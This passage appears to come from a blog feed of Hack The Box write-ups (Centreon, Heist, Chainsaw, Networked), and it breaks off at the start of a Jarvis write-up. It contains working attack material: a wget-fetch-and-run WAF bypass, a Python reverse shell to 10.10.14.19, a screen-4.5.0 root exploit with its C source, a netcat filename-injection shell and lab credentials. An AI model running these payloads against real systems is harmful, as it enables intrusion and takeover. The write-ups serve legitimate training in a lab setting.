*********************************************************Target: http://10.10.10.157/centreon/api/index.php?action=authenticateTotal requests: 92===================================================================ID           Response   Lines    Word     Chars       Payload===================================================================000000027:   200        0 L      1 W      60 Ch       \"password1\"Total time: 2.605513Processed Requests: 92Filtered Requests: 91Requests/sec.: 35.30973Hahaha, I should have tested this simple password before bruteforcing the login.I can login to the Centreon app with admin / password1:The version is probably vulnerable to CVE-2019-13024 since it’s running verison 19.04.0:I tried getting a reverse shell with the following but that didn’t work:# python Centreon-exploit.py http://10.10.10.157/centreon admin password1 10.10.14.19 4444[+] Retrieving CSRF token to submit the login form[+] Login token is : 86c1c3f00327a8b146385ebc0ca23bde[+] Logged In Sucssfully[+] Retrieving Poller token[+] Poller token is : 0e9822c471232e62c101655d120676b6[+] Injecting Done, triggering the payload[+] Check your netcat listener !The WAF might be preventing the exploit from working. I modified the exploit to add debugging and display the xml messageNow I’m seeing that it’s trying to execute id%2523 but it not’s configured in my exploit payload so maybe the WAF filtered out my payload.After a bit of trial an error I found that the following payload goes through the WAF:\"nagios_bin\": \"wget${IFS}-O${IFS}/tmp/test.py${IFS}http://10.10.14.19/test.py;python${IFS}/tmp/test.py\"I setup my test.py to contain a standard python reverse shell (since nc / ncat wasn’t installed on the target box):import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.19\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);$ iduid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)PrivescWhen I was checking for SUID files, I spotted something odd: The screen binary has been renamed to include the version number so this looks like a hint to me. I remember on the Flujab box that they used the same priv esc method.$ find / -perm /4000 2&gt;/dev/null/bin/mount/bin/ping/bin/screen-4.5.0[...]This particular version of the screen software opens the logfile with full root privileges so it’s possible to write any file anywhere on the system. In a nutshell, the priv esc is:  Compile /tmp/rootshell, a binary that simply spawns /bin/sh as user root  Compile /tmp/libhax.so, a shared library that will be loaded by screen as root. It chmods my rootshell binary to make it run as root.  Run screen and overwrite /etc/ld.so.preload to include the shared library /tmp/libhax.so  Run screen gain, this will load the shared library and execute the code  Now, the rootshell binary is SUID root and we can run it to get root access$ cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;__attribute__ ((__constructor__))void dropshell(void){    chown(\"/tmp/rootshell\", 0, 0);    chmod(\"/tmp/rootshell\", 04755);    unlink(\"/etc/ld.so.preload\");    printf(\"[+] done!\\n\");} &gt; EOF$ gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c$ rm -f /tmp/libhax.c$ cat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void){    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(\"/bin/sh\", NULL, NULL);}EOF$ gcc -o /tmp/rootshell /tmp/rootshell.c$ rm -f /tmp/rootshell.c$ cd /etc$ umask 000$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne  \"\\x0a/tmp/libhax.so\"$ /bin/screen-4.5.0 -ls[+] done!No Sockets found in /tmp/screens/S-www-data.$ /tmp/rootshelliduid=0(root) gid=0(root) groups=0(root),33(www-data),6000(centreon)Now that I’m root I can grab both flags at the same time.cat /root/root.txt1fdbcf8c...cat /home/shelby/user.txtfe619454..."
  },
  
  {
    "title": "Heist - Hack The Box",
    "url": "/posts/htb-writeup-heist/",
    "categories": "hackthebox, infosec",
    "tags": "linux, cisco, hashes, creds spray, rpcclient, winrm, procdump, memory forensics",
    "date": "2019-11-30 00:00:00 +0800",
    





    
    "snippet": "Heist starts off with a support page with a username and a Cisco IOS config file containing hashed &amp; encrypted passwords. After cracking two passwords from the config file and getting access to...",
    "content": "Heist starts off with a support page with a username and a Cisco IOS config file containing hashed &amp; encrypted passwords. After cracking two passwords from the config file and getting access to RPC on the Windows machine, I find additional usernames by RID cycling and then password spray to find a user that has WinRM access. Once I have a shell, I discover a running Firefox process and dump its memory to disk so I can do some expert-level forensics (ie: running strings) to find the administrator password.Summary  The admin page has guest access enabled and we can find a Cisco IOS configuration file on there  After cracking the three passwords from the config file, we are able to use rpcclient with one of the account to recover the list of usernames  Then we password spray the credentials we have and find that user chase can log in with WinRM  There’s a Firefox process already running on the box and we can obtain a memory dump from it  We find the administrator credentials in one of the browser request still in memoryPortscanroot@kali:~/htb/heist# nmap -sC -sV -p- -oA heist 10.10.10.149Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-10 20:39 EDTNmap scan report for heist.htb (10.10.10.149)Host is up (0.0065s latency).Not shown: 65530 filtered portsPORT      STATE SERVICE       VERSION80/tcp    open  http          Microsoft IIS httpd 10.0| http-cookie-flags:|   /:|     PHPSESSID:|_      httponly flag not set| http-methods:|_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Support Login Page|_Requested resource was login.php135/tcp   open  msrpc         Microsoft Windows RPC445/tcp   open  microsoft-ds?5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49668/tcp open  msrpc         Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: -3m38s, deviation: 0s, median: -3m38s| smb2-security-mode:|   2.02:|_    Message signing enabled but not required| smb2-time:|   date: 2019-08-10 20:38:41|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 199.09 secondsWebsiteThe webpage has a simple login page with an option to log in as guest at the bottom:After logging in as guest, I find a Cisco configuration in the opened trouble tickets. I also make note of the Hazard username, this will be useful later.Cracking some credentialsThe Cisco IOS configuration file here has two different types of password hashes. Cisco uses various hash algorithms across different products and software versions. The old password encryption type is called Type 7 encryption and has been known to be extremely weak for about 20+ years now. I still see this being used in production environments every week even though it doesn’t provide any real security (it’s akin to just base64 encoding your passwords in your configs, it’s trivial to recover the plaintext).For the two usernames, the Type 7 passwords can be reversed with any of the many Type 7 reversing tools available such as https://packetlife.net/toolbox/type7/.  rout3r / $uperP@ssword  admin / Q4)sJu\\Y8qz*A3?dThe enable password uses the Type 5 encryption which is just a salted MD5 hash. Again, these should be avoided whenever possible since they can be cracked pretty quickly using a GPU. Using Type 8 (PBKDF2) or Type 9 provides more security since it takes longer to crack.With John, I’m quickly able to crack the password with the rockyou.txt list:root@kali:~/htb/heist# john -w=/usr/share/wordlists/rockyou.txt hash.txtWarning: detected hash type \"md5crypt\", but the string is also recognized as \"md5crypt-long\"Use the \"--format=md5crypt-long\" option to force loading these as that type insteadUsing default input encoding: UTF-8Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])Will run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusstealth1agent    (?)User enumeration with RPC clientI’ll create user.txt and add the potential usernames that I have so far (admin, administrator and hazard) then do the same with passwords in pass.txt. To test all credentials, I use crackmapexec:I found one valid account: hazard:stealth1agentScanning with smbmap I don’t find any open shares that this user has access to:root@kali:~/htb/heist# smbmap -u hazard -p stealth1agent -H 10.10.10.149[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.149...[+] IP: 10.10.10.149:445\tName: heist.htb\tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tIPC$                                              \tREAD ONLYWith rpcclient I can connect and query the SID for the hazard user:root@kali:~/htb/heist# rpcclient -U hazard 10.10.10.149Enter WORKGROUP\\hazard's password:rpcclient $&gt; lookupnames hazardhazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)I can enumerate the list of users with lookupsids by changing the last digit of the SIDI got two additional users: chase and jasonLogging in to the box with WinRM and user chaseAfter password spraying with crackmapexec again, I found valid credentials for chaseThe port for WinRM is open so I’ll use that to log in:Note: I’m using evil-winrm these days but those screenshots were taken some time ago before I started using it.require 'winrm'# Author: Alamotconn = WinRM::Connection.new(  endpoint: 'http://10.10.10.149:5985/wsman',  #transport: :ssl,  user: 'chase',  password: 'Q4)sJu\\Y8qz*A3?d',  :no_ssl_peer_verification =&gt; true)command=\"\"conn.shell(:powershell) do |shell|    until command == \"exit\\n\" do        output = shell.run(\"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')\")        print(output.output.chomp)        command = gets        output = shell.run(command) do |stdout, stderr|            STDOUT.print stdout            STDERR.print stderr        end    end    puts \"Exiting with code #{output.exitcode}\"endExtracting more credentials from FirefoxI’ll upgrade that shell to a Meterpreter first:I check out the c:\\inetpub\\wwwroot\\ directory for any hardcoded credentials in the PHP code and find a SHA256 hash for an admin account in the login.php file:hash( 'sha256', $_REQUEST['login_password']) === '91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040')Fail: I wasn’t able to crack this hash nor did I find it on crackstation.net.When checking out the running processes, I notice that Firefox is running: 6264  5232  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6388  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6588  792   wsmprovhost.exe          x64   0        SUPPORTDESK\\Chase  C:\\Windows\\System32\\wsmprovhost.exe 6656  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exe 6732  792   dllhost.exe              x64   1        SUPPORTDESK\\Chase  C:\\Windows\\System32\\dllhost.exe 7052  6264  firefox.exe              x64   1        SUPPORTDESK\\Chase  C:\\Program Files\\Mozilla Firefox\\firefox.exeIf Firefox is running then there might some credentials in memory so I’ll use procdump to create a memory dump and inspect it after:Before using a memory forensics tool like Volatility to inspect the memory dump, I’ll try using strings and grep to look for the string password:Looks like I found the admin’s credentials, I’ll use WinRM again to log in:"
  },
  
  {
    "title": "Chainsaw - Hack The Box",
    "url": "/posts/htb-writeup-chainsaw/",
    "categories": "hackthebox, infosec",
    "tags": "linux, smart contract, ethereum, ipfs, suid, hidden, bmap, command injection",
    "date": "2019-11-23 00:00:00 +0800",
    





    
    "snippet": "I learned a bit about Ethereum and smart contracts while doing the Chainsaw box from Hack the Box. There’s a command injection vulnerability in a smart contract that gives me a shell. Then after do...",
    "content": "I learned a bit about Ethereum and smart contracts while doing the Chainsaw box from Hack the Box. There’s a command injection vulnerability in a smart contract that gives me a shell. Then after doing some googling on IPFS filesystem, I find an encrypted SSH key for another user which I can crack. To get root access I use another smart contract to change the password used by a SUID binary running as root, then find the flag hidden in the slack space for root.txtSummary  Find a smart contract source code and address located on the FTP server  The contract contains a command injection vulnerability that get us RCE and a shell on the system  There is an IPFS filesystem on the box and we find an encrypted SSH key for user bobby  After cracking the key we can log in as user bobby and get the user flag  We then find a SUID binary and another smart contract running on a separate instance of ganache-cli  By using the contract we can change the password and then get root access through the SUID binary  The root.txt file doesn’t contain the system flag but a hint that we need to keep looking further  I found the flag using bmap to look at the slack space in root.txtPortscan# nmap -p- 10.10.10.142Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-16 21:26 EDTNmap scan report for chainsaw.htb (10.10.10.142)Host is up (0.021s latency).Not shown: 65532 closed portsPORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh9810/tcp open  unknownFTP serverAnonymous access is allowed on the FTP server and there’s a few files I can download.# ftp 10.10.10.142Connected to 10.10.10.142.220 (vsFTPd 3.0.3)Name (10.10.10.142:root): anonymous331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r--    1 1001     1001        23828 Dec 05  2018 WeaponizedPing.json-rw-r--r--    1 1001     1001          243 Dec 12  2018 WeaponizedPing.sol-rw-r--r--    1 1001     1001           44 Jun 16 21:30 address.txt226 Directory send OK.ftp&gt;Ethereum smart contract #1The address.txt file contains an Ethereum checksumed address:0xCeC270D64E45aDc8C6057C764f13448d500de096The WeaponizedPing.sol file contains the source code of a smart contract. The contract itself doesn’t seem to do much: you can only get/set the domain variable.pragma solidity ^0.4.24;contract WeaponizedPing {  string store = \"google.com\";  function getDomain() public view returns (string)   {      return store;  }  function setDomain(string _value) public   {      store = _value;  }}The WeaponizedPing.json file has a bunch of information, including the source code, the transactionHash and the compiler used to compile the program.\"source\": \"pragma solidity ^0.4.24;\\n\\n\\ncontract WeaponizedPing {\\n\\n ...  \"sourcePath\": \"/opt/WeaponizedPing/WeaponizedPing.sol\",  \"ast\": {    \"absolutePath\": \"/opt/WeaponizedPing/WeaponizedPing.sol\",    \"exportedSymbols\": {      \"WeaponizedPing\": [        80...\"compiler\": {    \"name\": \"solc\",    \"version\": \"0.4.24+commit.e67f0147.Emscripten.clang\"  },  \"networks\": {    \"1543936419890\": {      \"events\": {},      \"links\": {},      \"address\": \"0xaf6ce61d342b48cc992820a154fe0f533e5e487c\",      \"transactionHash\": \"0x5e94c662f1048fca58c07e16506f1636391f757b07c1b6bb6fbb4380769e99e1\"    }  },  \"schemaVersion\": \"2.0.1\",  \"updatedAt\": \"2018-12-04T15:24:57.205Z\"To compile and play with the smart contract I used http://remix.ethereum.org/ which has a JavaScript VM to run the compiled code. The service running on port 9810 is probably a Web3 service so I configured Remix’s environment to use the Web3 service running on the box.I opened the source file I downloaded from the server:Then I selected the same compiler version specified in the JSON file:There’s a few warnings after compiling but they are probably safe to ignore:Once we have the file compiled we can deploy a new contract or use an existing one if we know the address. Here, we have an address from address.txt: 0xCeC270D64E45aDc8C6057C764f13448d500de096. Once I enter the address, I can see the deployed contract and get the domain assigned to the contract:The name WeaponizedPing is a hint. When we set a domain then do a getDomain on it, the box does a ping back to the IP specified:There is a simple command injection in the code that pings the domain/IP and we can execute other commands such as nc to get a reverse shell:After getting the reverse shell I dropped my SSH public key into the /home/administrator/.ssh/authorized_keys file so I can log in directly.InterPlanetary File SystemThe /home/administrator directory contains a CSV file chainsaw-emp.csv with the list of employees.Employees,Active,Positionarti@chainsaw,No,Network Engineerbryan@chainsaw,No,Java Developerbobby@chainsaw,Yes,Smart Contract Auditorlara@chainsaw,No,Social Media Managerwendy@chainsaw,No,Mobile Application DeveloperThe bobby user is the only active user according to the CSV and is also the only user that has a valid login shell and a home directory:bobby:x:1000:1000:Bobby Axelrod:/home/bobby:/bin/bashadministrator:x:1001:1001:Chuck Rhoades,,,,IT Administrator:/home/administrator:/bin/basharti:x:997:996::/home/arti:/bin/falselara:x:996:995::/home/lara:/bin/falsebryan:x:995:994::/home/bryan:/bin/falsewendy:x:994:993::/home/wendy:/bin/false[...]administrator@chainsaw:~$ ls -l /hometotal 8drwxr-x--- 10 administrator administrator 4096 Jun 16 21:55 administratordrwxr-x---  9 bobby         bobby         4096 Jan 23 09:03 bobbyThe /home/administrator/maintain directory has a python script that generates OpenSSL private/public keys.The sub-directory pub contains the public keys for a few users including bobby:administrator@chainsaw:~/maintain/pub$ ls -l total 20-rw-rw-r-- 1 administrator administrator 380 Dec 13  2018 arti.key.pub-rw-rw-r-- 1 administrator administrator 380 Dec 13  2018 bobby.key.pub-rw-rw-r-- 1 administrator administrator 380 Dec 13  2018 bryan.key.pub-rw-rw-r-- 1 administrator administrator 380 Dec 13  2018 lara.key.pub-rw-rw-r-- 1 administrator administrator 380 Dec 13  2018 wendy.key.pubI noticed that there is an .ipfs directory inside the administrator home directory:administrator@chainsaw:~$ ls -l .ipfstotal 28drwxr-xr-x 41 administrator administrator 4096 Jan 23 09:27 blocks-rw-rw----  1 administrator administrator 5273 Dec 13  2018 configdrwxr-xr-x  2 administrator administrator 4096 Jan 23 09:27 datastore-rw-------  1 administrator administrator  190 Dec 13  2018 datastore_specdrwx------  2 administrator administrator 4096 Dec 13  2018 keystore-rw-r--r--  1 administrator administrator    2 Dec 13  2018 versionI didn’t know what IPFS was so I did some research and found that it’s https://ipfs.io/, a distributed file-system.To see the files that are uploaded to the file system, I used:administrator@chainsaw:~/.ipfs$ ipfs refs localQmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5YQmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAxQmfFUFGiPQA5Wr9tM7K6A6VRCkem6KqssgcwQGgStRWvf7QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwBQmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn[...]QmPhk6cJkRcFfZCdYam4c9MKYjFG9V29LswUnbrFNhtk2SQmYd1CX2vwxb5npkm4r597zJkqhpqy4k82Np48FS8F6bAvQmSyJKw6U6NaXupYqMLbEbpCdsaYR5qiNGRHjLKcmZV17rQmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvoQmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRSThen I dumped the content of everything into a single big file:ipfs cat QmYCvbfNbCwFR45HiNP45rwJgvatpiW38D961L5qAhUM5Y &gt;&gt; out.txtipfs cat QmPctBY8tq2TpPufHuQUbe2sCxoy2wD5YRB6kdce35ZwAx &gt;&gt; out.txtipfs cat QmfFUFGiPQA5Wr9tM7K6A6VRCkem6KqssgcwQGgStRWvf7 &gt;&gt; out.txtipfs cat QmbwWcNc7TZBUDFzwW7eUTAyLE2hhwhHiTXqempi1CgUwB &gt;&gt; out.txtipfs cat QmdL9t1YP99v4a2wyXFYAQJtbD9zKnPrugFLQWXBXb82sn &gt;&gt; out.txt[...]ipfs cat QmZZRTyhDpL5Jgift1cHbAhexeE1m2Hw8x8g7rTcPahDvo &gt;&gt; out.txtipfs cat QmUH2FceqvTSAvn6oqm8M49TNDqowktkEx4LgpBx746HRS &gt;&gt; out.txtipfs cat QmcMCDdN1qDaa2vaN654nA4Jzr6Zv9yGSBjKPk26iFJJ4M &gt;&gt; out.txtipfs cat QmPZ9gcCEpqKTo6aq61g2nXGUhM4iCL3ewB6LDXZCtioEB &gt;&gt; out.txtipfs cat Qmc7rLAhEh17UpguAsEyS4yfmAbeqSeSEz4mZZRNcW52vV &gt;&gt; out.txtI found an email for user bobby:I base64 decoded the message:There’s an attachment in the email with an SSH private key: bobby.key.encThe key is encrypted but the password is found in rockyou.txt:Now we can log in as bobby with the SSH key:root@ragingunicorn:~/htb/chainsaw# ssh -i bobby.key bobby@10.10.10.142Enter passphrase for key 'bobby.key': bobby@chainsaw:~$ cat user.txtaf8d9df9...Ethereum smart contract #2The /home/bobby/projects/ChainsawClub directory has another smart contract ChainsawClub.sol:pragma solidity ^0.4.22;contract ChainsawClub {  string username = 'nobody';  string password = '7b455ca1ffcb9f3828cfdde4a396139e';  bool approve = false;  uint totalSupply = 1000;  uint userBalance = 0;  function getUsername() public view returns (string) {      return username;  }  function setUsername(string _value) public {      username = _value;  }  function getPassword() public view returns (string) {      return password;  }  function setPassword(string _value) public {      password = _value;  }  function getApprove() public view returns (bool) {      return approve;  }  function setApprove(bool _value) public {      approve = _value;  }  function getSupply() public view returns (uint) {      return totalSupply;  }  function getBalance() public view returns (uint) {      return userBalance;  }  function transfer(uint _value) public {      if (_value &gt; 0 &amp;&amp; _value &lt;= totalSupply) {          totalSupply -= _value;          userBalance += _value;      }  }  function reset() public {      username = '';      password = '';      userBalance = 0;      totalSupply = 1000;      approve = false;  }}The ChainsawClub binary is SUID so this is likely our target:$ ls -ltotal 148-rwsr-xr-x 1 root root  16544 Jan 12 04:23 ChainsawClubThe program requires credentials to log in.I tried using nobody and 7b455ca1ffcb9f3828cfdde4a396139e that I found in the source but that didn’t work. The password looks like an MD5 hash but I couldn’t crack it either.I saw that an address.txt file is created when I first launch the program.bobby@chainsaw:~/projects/ChainsawClub$ cat address.txt 0x8DDa7ee0dA4DfCF6b26b64c1B89A3a1F9e76EAB6I disassembled the binary with Ghidra to see how it works and saw that it simply executes another binary from root’s home directory. I don’t have access to root yet so I can’t disassemble the /root/ChainsawClub/dist/ChainsawClub/ChainsawClub file.The program is probably looking at the contract to get the username and password. I have the address so I should be able to invoke the setUsername and setPassword  methods to change the credentials and then log in. I compiled the contract and pointed it at the address 0xCeC270D64E45aDc8C6057C764f13448d500de096 from the address.txt but I wasn’t able to pull any data from it. It probably doesn’t exist in the blockchain.After looking around the system for a while, I found a 2nd instance of ganache-cli running locally on port 63991. I port forwarded 63991 using SSH so I could access it from Remix and found that the contract is working and I can pull data from it:I changed the password to the MD5 value of yolo1234 and changed to approval status to true:I tried logging in but I need fundsI used the transfer method to add 1000 ether then I was able to log in:Looks like I’m root but there’s one more step left:I found the flag hidden in the slack space of the root.txt file. I used the bmap utility already installed on the system."
  },
  
  {
    "title": "Networked - Hack The Box",
    "url": "/posts/htb-writeup-networked/",
    "categories": "hackthebox, infosec",
    "tags": "linux, php, upload, double extension, cronjob, command injection, sudo",
    "date": "2019-11-16 00:00:00 +0800",
    





    
    "snippet": "Networked was an easy box that starts off with a classic insecure upload vulnerability in an image gallery web application. The Apache server is misconfigured and let me use a double extension to g...",
    "content": "Networked was an easy box that starts off with a classic insecure upload vulnerability in an image gallery web application. The Apache server is misconfigured and let me use a double extension to get remote code execution through my PHP script. To escalate to root, we have to find a command injection vulnerability in the script that checks for web application attacks, then exploit another script running as root that changes the ifcfg file.Summary  We can upload a PHP file with a double extension in the image gallery web application and get RCE  To escalate to user user guly I use a command injection vulnerability in the check_attack.php script  There’s another command injection vulnerability  in the changename.sh script that get me a root shellroot@kali:~# nmap -sC -sV -p- 10.10.10.146Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-25 13:51 EDTNmap scan report for 10.10.10.146Host is up (0.17s latency).Not shown: 65532 filtered portsPORT    STATE  SERVICE VERSION22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)| ssh-hostkey:|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Site doesn't have a title (text/html; charset=UTF-8).443/tcp closed httpsWebsite enumerationThe website index page doesn’t have anything interesting.In the HTML code there’s a comment about some pages not being linked.I’m gonna use gobuster next and scan for files and directories.There’s a couple of files in there that looks promising. Luckily for me, there’s a backup.tar file in the /backup directory that contains the sources files:root@kali:~/htb/networked# tar xvf backup.tarindex.phplib.phpphotos.phpupload.phpThe /photos.php contains an image gallery:The /upload.php page is used to upload new images to the gallery:When I upload an image, I get the following message then the picture is added in the gallery. Note that the image file name is renamed to the IP addres of my own machine, with dots replaced by underscores.When I try to upload a PHP script, I get an error message so there is some kind of validation performed on uploaded files:Hunting for vulnerabilities in the source codeLooking at the upload.php file, I pick up a few checks that the code makes against my uploaded file:      The filesize must less than 60,000 bytes        The extension of the uploaded file must be one of the following: .jpg, .png, .gif, .jpeg        The MIME type of the uploaded file must start with image/ (the code below in from lib.php)  Note that the file_mime_type function uses finfo_open to return the MIME type so it’ll look at the content of the file to determine it’s MIME type. I can’t just override the MIME type with Content-Type: image/png in Burp.I’ll use my previous valid image file upload and add PHP code at the bottom of the payload and change the extension to .php.png to pass the checks:File upload is successful and I see the uploaded file in the gallery (filename has been changed to the IP address but the double extension has been kept):Browsing to http://10.10.10.146/uploads/10_10_14_11.php.png I see that my PHP code embedded in the image file has been executed.Later once I got root I found out why the webserver executes the image file as PHP even though the extension is .png. The Apache configuration uses the AddHandler php5-script .php statement instead of SetHandler so it will activate the handler if the .php suffix is present anywhere in the filename. The following blog explains this in more details: https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandlerGetting a shell as user apacheNow that I have RCE, I can call netcat and get a reverse shell that way.Unfortunately my current apache user doesn’t have access to read user.txt so I likely need to escalate to user guly next.bash-4.2$ cd /home/gulybash-4.2$ ls -latotal 28drwxr-xr-x. 2 guly guly 159 Jul  9 13:40 .drwxr-xr-x. 3 root root  18 Jul  2 13:27 ..lrwxrwxrwx. 1 root root   9 Jul  2 13:35 .bash_history -&gt; /dev/null-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc-rw-------  1 guly guly 639 Jul  9 13:40 .viminfo-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly-r--------. 1 guly guly  33 Oct 30  2018 user.txtThere’s a crontab file crontab.guly that contains the following:*/3 * * * * php /home/guly/check_attack.phpThe crontab executes check_attack.php which I also have read access to:&lt;?phprequire '/var/www/html/lib.php';$path = '/var/www/html/uploads/';$logpath = '/tmp/attack.log';$to = 'guly';$msg= '';$headers = \"X-Mailer: check_attack.php\\r\\n\";$files = array();$files = preg_grep('/^([^.])/', scandir($path));foreach ($files as $key =&gt; $value) {\t$msg='';  if ($value == 'index.html') {\tcontinue;  }  #echo \"-------------\\n\";  #print \"check: $value\\n\";  list ($name,$ext) = getnameCheck($value);  $check = check_ip($name,$value);  if (!($check[0])) {    echo \"attack!\\n\";    # todo: attach file    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);    exec(\"rm -f $logpath\");    exec(\"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;\");    echo \"rm -f $path$value\\n\";    mail($to, $msg, $msg, $headers, \"-F$value\");  }}The above code looks for files in /var/www/html/uploads/ then runs the getnameCheck function from lib.php against the filename. When the filename fails the check, a logfile /tmp/attack.log is created and $msg is written to the file. $msg is set to null in the code so nothing will ever get written to that log file. The code then deletes any file that is invalid using exec(\"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;\");. This is where the command injection vulnerability lies.The script uses the exec() function to pass the /bin/rm command instead of using of the native PHP function to delete files. The $path variable is set in the code and I can’t control it but I can control the $value variable since it’s the same of the invalid file in /var/www/html/uploads/. My goal here is to inject a command like the following: nohup /bin/rm -f /var/www/html/uploads/; nc -e /bin/bash 10.10.14.11 5555 &gt; /dev/null 2&gt;&amp;1 &amp;.I would need to create a filename like ; nc -e /bin/bash 10.10.14.11 5555 but forward slashes are not valid in a filename so I will use $(which bash) instead to return the full path to bash.A few moments later I get a shell as guly and I get the first flag:PrivescThe path to root is pretty obvious since there’s a sudo entry for changename.sh[guly@networked ~]$ sudo -lMatching Defaults entries for guly on networked:    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,    env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS\",    env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\",    env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\",    env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\",    env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\",    secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser guly may run the following commands on networked:    (root) NOPASSWD: /usr/local/sbin/changename.sh[guly@networked ~]$The shell script requests a few variable from stdin, adds those to /etc/sysconfig/network-scripts/ifcfg-guly and then ifup is invoked to bring up the interface. There’s a regex filter in place to filter special characters.#!/bin/bash -pcat &gt; /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoFDEVICE=guly0ONBOOT=noNM_CONTROLLED=noEoFregexp=\"^[a-zA-Z0-9_\\ /-]+$\"for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do\techo \"interface $var:\"\tread x\twhile [[ ! $x =~ $regexp ]]; do\t\techo \"wrong input, try again\"\t\techo \"interface $var:\"\t\tread x\tdone\techo $var=$x &gt;&gt; /etc/sysconfig/network-scripts/ifcfg-gulydone/sbin/ifup guly0After playing with the input for a few minutes I found that I can get RCE as root by adding commands after a space:I can’t invoke netcat directly because the hypen character is filtered out. However I can put the command I want to execute in a script that I will call through the sudo command.And… I get a shell as root:"
  },
  
  {
    "title": "Jarvis - Hack The Box",
    "url": "/posts/htb-writeup-jarvis/",
    "categories": "hackthebox, infosec",
    "tags": "linux, sqli, sqlmap, waf, command injection, suid, systemd",
    "date": "2019-11-09 00:00:00 +0800",
    





    
    "snippet": "The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per ...",
    "content": "The entrypoint for Jarvis is an SQL injection vulnerability in the web application to book hotel rooms. There is a WAF but I was able to easily get around it by lowering the amount of requests per second in sqlmap and changing the user-agent header. After landing a shell, I exploit a simple command injection to get access to another user then I use systemctl which has been set SUID root to create a new service and get root RCE.Summary  There’s a SQL injection vulnerability in the room.php code that can be used to dump the database and get RCE  We can escalate from www-data to pepper user by command injection in the simpler.py script  For privesc, the systemctl has been made SUID so we can just register a new service that spawns a reverse shell as rootPortscan# nmap -sC -sV -p- 10.10.10.143Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-23 13:21 EDTNmap scan report for jarvis.htb (10.10.10.143)Host is up (0.024s latency).Not shown: 65532 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)| ssh-hostkey: |   2048 